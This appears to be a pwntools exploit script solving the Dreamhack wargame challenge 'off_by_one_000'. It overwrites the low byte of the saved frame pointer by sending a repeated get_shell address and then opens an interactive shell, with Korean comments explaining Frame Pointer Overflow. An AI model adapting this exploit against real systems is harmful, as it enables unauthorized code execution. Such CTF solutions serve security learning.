from pwn import *

p = remote('host3.dreamhack.games', 18825)
# p = process('./off_by_one_000')
e = ELF('./off_by_one_000')

get_shell = 0x80485db

# SFP 하위 1바이트는 오염이 가능하다. 이는 Frame Pointer Overflow 공격으로 이어진다.
# SFP가 하위 1바이트가 널바이트로 덮이면.. EBP값이 바뀌게 된다.
name = p32(get_shell) * 0x41

p.sendafter(b'Name: ', name)

p.interactive()

# Frame Pointer Overflow의 원리
# 요약하자면 조작된 SFP+4에 쉘코드의 주소 혹은 원하는 함수의 주소를 위치시켜놓으면 그곳으로 점프가 가능하다.
